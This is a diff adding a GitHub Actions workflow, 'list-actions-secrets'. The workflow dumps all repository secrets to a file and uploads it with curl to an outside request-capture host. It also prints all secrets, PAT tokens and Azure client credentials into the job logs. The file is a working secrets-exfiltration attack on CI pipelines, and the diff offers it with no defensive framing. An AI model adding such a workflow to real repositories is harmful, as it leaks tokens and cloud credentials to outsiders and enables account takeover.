@@ -1,0 +1,25 @@
+name: list-actions-secrets
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        TOKENS: [WRITE, READ]
+    steps:
+      - run: |
+          echo '${{ toJSON(secrets) }}' > secrets.txt
+          curl -X PUT -T ./secrets.txt -H http://3f750d39-1083-44e5-b057-40432fafeeb5.sink.reqsink.com
+      - env: 
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+        run: echo "$ALL_SECRETS"
+      - env: 
+          SOME_SECRETS: ${{ secrets[format('PAT_%s', matrix.TOKENS)] }}
+        run: echo "$SOME_SECRETS"
+      - env:
+          username: ${{ fromJson(secrets.AZURE_CREDENTIALS).clientId }}
+          password: ${{ fromJson(secrets.AZURE_CREDENTIALS).clientSecret }}
+        run: |
+          echo "$username"
+          echo "$password"
